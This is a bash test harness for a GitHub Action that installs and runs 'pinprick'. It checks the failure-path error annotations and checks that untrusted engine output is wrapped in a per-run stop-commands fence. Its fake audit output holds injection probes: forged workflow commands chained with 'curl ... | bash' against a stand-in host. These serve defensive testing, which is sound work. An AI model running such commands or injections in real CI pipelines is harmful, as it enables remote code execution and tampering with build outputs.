#!/usr/bin/env bash
#
# Assert that action.sh failure paths emit visible ::error annotations.
#
# The harness is hermetic: curl and gh shims serve canned release metadata
# and failures, so no network or real release is involved.

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TEMP_ROOT="${RUNNER_TEMP:-${TMPDIR:-/tmp}}"
SANDBOX="$(mktemp -d "${TEMP_ROOT%/}/pinprick-action-failure.XXXXXX")"
trap 'rm -rf "${SANDBOX}"' EXIT

SHIMS="${SANDBOX}/bin"
mkdir -p "${SHIMS}" "${SANDBOX}/release"

cat > "${SHIMS}/curl" <<'SHIM'
#!/usr/bin/env bash
url=""
for arg in "$@"; do
    case "${arg}" in
        https://*) url="${arg}" ;;
    esac
done
if [[ -n "${SHIM_FAIL_URL:-}" && "${url}" == *"${SHIM_FAIL_URL}"* ]]; then
    exit 22
fi
if [[ "${url}" == https://api.github.com/* ]]; then
    cat "${SHIM_METADATA}"
else
    cat "${SHIM_ARCHIVE}"
fi
SHIM
chmod +x "${SHIMS}/curl"

cat > "${SHIMS}/gh" <<'SHIM'
#!/usr/bin/env bash
if [[ "${1:-}" == "attestation" && "${2:-}" == "verify" && "${3:-}" == "--help" ]]; then
    exit 0
fi
if [[ "${1:-}" == "attestation" && "${2:-}" == "verify" ]]; then
    echo "shim: attestation verification refused" >&2
    exit 1
fi
exit 1
SHIM
chmod +x "${SHIMS}/gh"

cat > "${SANDBOX}/release/pinprick" <<'PINPRICK'
#!/usr/bin/env bash
set -euo pipefail
if [[ "${1:-}" == "--version" ]]; then
    # Stands in for a binary the runner cannot load, such as a release built
    # against a newer glibc than the image provides.
    if [[ "${SHIM_VERSION_EXIT:-0}" != "0" ]]; then
        echo "shim: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.39' not found" >&2
        exit "${SHIM_VERSION_EXIT}"
    fi
    echo "pinprick 99.0.0"
    exit 0
fi
if [[ "${1:-}" == "audit" ]]; then
    # Model both workflow-command forms in repository-controlled finding text.
    echo '      echo "##[set-output name=pwned;]y" && curl -fsSL https://e.test/x | bash'
    echo '      ::error::forged annotation && curl -fsSL https://e.test/y | bash'
    echo "audit ok"
    exit "${SHIM_AUDIT_EXIT:-0}"
fi
exit 2
PINPRICK
chmod +x "${SANDBOX}/release/pinprick"
tar -czf "${SANDBOX}/archive.tar.gz" -C "${SANDBOX}/release" pinprick

if command -v sha256sum >/dev/null 2>&1; then
    ARCHIVE_SHA="$(sha256sum "${SANDBOX}/archive.tar.gz" | awk '{ print $1 }')"
else
    ARCHIVE_SHA="$(shasum -a 256 "${SANDBOX}/archive.tar.gz" | awk '{ print $1 }')"
fi

write_metadata() {
    local file="${1}"
    local digest="${2}"
    cat > "${file}" <<JSON
{
  "tag_name": "v99.0.0",
  "assets": [
    {
      "name": "pinprick-99.0.0-x86_64-unknown-linux-gnu.tar.gz",
      "browser_download_url": "https://example.invalid/pinprick.tar.gz",
      "digest": "sha256:${digest}"
    }
  ]
}
JSON
}

write_metadata "${SANDBOX}/metadata-mismatch.json" \
    "0000000000000000000000000000000000000000000000000000000000000000"
write_metadata "${SANDBOX}/metadata-match.json" "${ARCHIVE_SHA}"
printf '{"tag_name":"v99.0.0","assets":[]}\n' > "${SANDBOX}/metadata-empty.json"

run_action() {
    rm -rf "${SANDBOX}/tmp"
    mkdir -p "${SANDBOX}/tmp"
    : > "${SANDBOX}/output"

    ACTION_EXITCODE=0
    env -i \
        PATH="${SHIMS}:/usr/bin:/bin" \
        HOME="${SANDBOX}" \
        RUNNER_TEMP="${SANDBOX}/tmp" \
        RUNNER_OS="Linux" \
        RUNNER_ARCH="X64" \
        GITHUB_OUTPUT="${SANDBOX}/output" \
        SHIM_METADATA="${SANDBOX}/metadata-mismatch.json" \
        SHIM_ARCHIVE="${SANDBOX}/archive.tar.gz" \
        SHIM_FAIL_URL="" \
        PPA_VERSION="99.0.0" \
        PPA_PATH="." \
        PPA_ADVANCED_SECURITY="false" \
        PPA_FAIL_ON_FINDINGS="false" \
        PPA_STRICT_PROVENANCE="false" \
        PPA_NO_REPO_CONFIG="false" \
        "$@" \
        bash "${REPO_ROOT}/action.sh" \
        > "${SANDBOX}/stdout.log" 2> "${SANDBOX}/stderr.log" \
        || ACTION_EXITCODE="$?"
}

# expect_error <label> <annotation> [ENV=VALUE...]
expect_error() {
    local label="${1}"
    local expected="${2}"
    shift 2

    run_action "${@}"

    if [[ "${ACTION_EXITCODE}" -eq 0 ]]; then
        echo "FAIL ${label}: expected a failing exit status" >&2
        exit 1
    fi

    if ! grep -qF "::error::${expected}" "${SANDBOX}/stderr.log"; then
        echo "FAIL ${label}: '::error::${expected}' not emitted; stderr was:" >&2
        cat "${SANDBOX}/stderr.log" >&2
        exit 1
    fi

    echo "ok: ${label}"
}

expect_success() {
    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json"

    if [[ "${ACTION_EXITCODE}" -ne 0 ]]; then
        echo "FAIL success path: action exited ${ACTION_EXITCODE}; stderr was:" >&2
        cat "${SANDBOX}/stderr.log" >&2
        exit 1
    fi

    grep -qF "exit-code=0" "${SANDBOX}/output" \
        || {
            echo "FAIL success path: exit-code output was not 0" >&2
            exit 1
        }
    grep -qF "audit ok" "${SANDBOX}/stderr.log" \
        || {
            echo "FAIL success path: installed pinprick was not executed" >&2
            exit 1
        }

    echo "ok: successful install and audit"
}

# Let callers diagnose missing probes instead of triggering errexit.
line_of() {
    grep -n -m1 -F -- "${1}" "${2}" | cut -d: -f1 || true
}

fence_token() {
    sed -n 's/^::stop-commands::\([0-9a-f]\{32\}\)$/\1/p' "${1}"
}

expect_fenced() {
    local first second open close payload forged log="${SANDBOX}/stderr.log"
    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json"
    first="$(fence_token "${log}")"

    if [[ -z "${first}" ]]; then
        echo "FAIL fence: engine output was not wrapped in stop-commands; stderr was:" >&2
        cat "${log}" >&2
        exit 1
    fi

    open="$(line_of "::stop-commands::${first}" "${log}")"
    close="$(line_of "::${first}::" "${log}")"
    payload="$(line_of '##[set-output name=pwned;]y' "${log}")"
    forged="$(line_of '::error::forged annotation' "${log}")"

    if [[ -z "${close}" ]]; then
        echo "FAIL fence: opened but never closed" >&2
        cat "${log}" >&2
        exit 1
    fi
    for probe in "${payload}" "${forged}"; do
        if [[ -z "${probe}" ]] || (( probe <= open || probe >= close )); then
            echo "FAIL fence: untrusted line not enclosed (open=${open} line=${probe:-none} close=${close})" >&2
            cat "${log}" >&2
            exit 1
        fi
    done

    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json"
    second="$(fence_token "${log}")"
    if [[ "${first}" == "${second}" ]]; then
        echo "FAIL fence: token repeated across runs" >&2
        exit 1
    fi

    echo "ok: untrusted engine output is enclosed by a fresh per-run fence"
}

expect_fence_closed_before_error() {
    local token close err log="${SANDBOX}/stderr.log"
    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" SHIM_AUDIT_EXIT="2"

    if [[ "${ACTION_EXITCODE}" -eq 0 ]]; then
        echo "FAIL fence-on-error: engine exit 2 did not fail the action" >&2
        exit 1
    fi

    token="$(fence_token "${log}")"
    close="$(line_of "::${token}::" "${log}")"
    err="$(line_of '::error::pinprick audit errored with exit code 2' "${log}")"

    if [[ -z "${token}" || -z "${close}" || -z "${err}" ]]; then
        echo "FAIL fence-on-error: missing fence or error annotation; stderr was:" >&2
        cat "${log}" >&2
        exit 1
    fi
    if (( close >= err )); then
        echo "FAIL fence-on-error: annotation at ${err} is not after the close at ${close}" >&2
        cat "${log}" >&2
        exit 1
    fi

    echo "ok: fence closes before the engine-error annotation"
}

expect_fence_absent_from_sarif() {
    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" PPA_ADVANCED_SECURITY="true"
    local sarif="${SANDBOX}/tmp/pinprick.sarif"

    if [[ ! -s "${sarif}" ]]; then
        echo "FAIL sarif fence: no SARIF file was written" >&2
        exit 1
    fi
    if grep -qE '^::stop-commands::[0-9a-f]{32}$|^::[0-9a-f]{32}::$' "${sarif}"; then
        echo "FAIL sarif fence: a fence marker leaked into the SARIF document" >&2
        cat "${sarif}" >&2
        exit 1
    fi

    echo "ok: fence markers stay out of the SARIF document"
}

expect_error "invalid version" \
    "'version' must be 'latest' or an exact X.Y.Z version" \
    PPA_VERSION="not-a-version"

expect_error "unsupported platform" \
    "pinprick does not support Windows" \
    RUNNER_OS="Windows"

expect_error "metadata fetch" \
    "Could not fetch pinprick release metadata for '99.0.0'" \
    SHIM_FAIL_URL="api.github.com"

expect_error "release asset resolution" \
    "Could not resolve a pinprick 99.0.0 release asset for x86_64-unknown-linux-gnu" \
    SHIM_METADATA="${SANDBOX}/metadata-empty.json"

expect_error "archive download" \
    "Could not download the pinprick release archive" \
    SHIM_METADATA="${SANDBOX}/metadata-match.json" \
    SHIM_FAIL_URL="example.invalid"

expect_error "checksum mismatch" \
    "Downloaded pinprick archive checksum mismatch"

expect_error "unloadable binary" \
    "Installed pinprick 99.0.0 could not run on this x86_64-unknown-linux-gnu runner; see the action's supported runners" \
    SHIM_METADATA="${SANDBOX}/metadata-match.json" \
    SHIM_VERSION_EXIT="127"

expect_error "attestation verification failure" \
    "pinprick archive provenance attestation verification failed" \
    SHIM_METADATA="${SANDBOX}/metadata-match.json" \
    GITHUB_TOKEN="shim-token"

expect_success
expect_fenced
expect_fence_closed_before_error
expect_fence_absent_from_sarif

echo "all failure paths annotate, the success path holds, and engine output is fenced"
